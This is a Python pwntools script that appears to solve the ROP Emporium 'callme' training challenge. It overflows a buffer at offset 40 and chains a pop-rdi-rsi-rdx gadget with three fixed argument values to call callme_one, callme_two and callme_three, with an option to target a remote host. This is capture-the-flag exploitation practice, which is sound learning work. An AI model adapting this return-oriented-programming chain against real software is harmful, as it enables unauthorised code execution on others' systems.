from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = """
init-pwndbg
continue
""".format(**locals())

exe = "./callme"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
context.terminal = "kitty"

io = start()
offset = 40

pop_rdi_rsi_rdx = 0x000000000040093C

payload = flat(
    {
        offset: [
            pop_rdi_rsi_rdx,
            0xDEADBEEFDEADBEEF,
            0xCAFEBABECAFEBABE,
            0xD00DF00DD00DF00D,
            elf.sym["callme_one"],
            pop_rdi_rsi_rdx,
            0xDEADBEEFDEADBEEF,
            0xCAFEBABECAFEBABE,
            0xD00DF00DD00DF00D,
            elf.sym["callme_two"],
            pop_rdi_rsi_rdx,
            0xDEADBEEFDEADBEEF,
            0xCAFEBABECAFEBABE,
            0xD00DF00DD00DF00D,
            elf.sym["callme_three"],
        ]
    }
)

io.sendline(payload)

io.interactive()
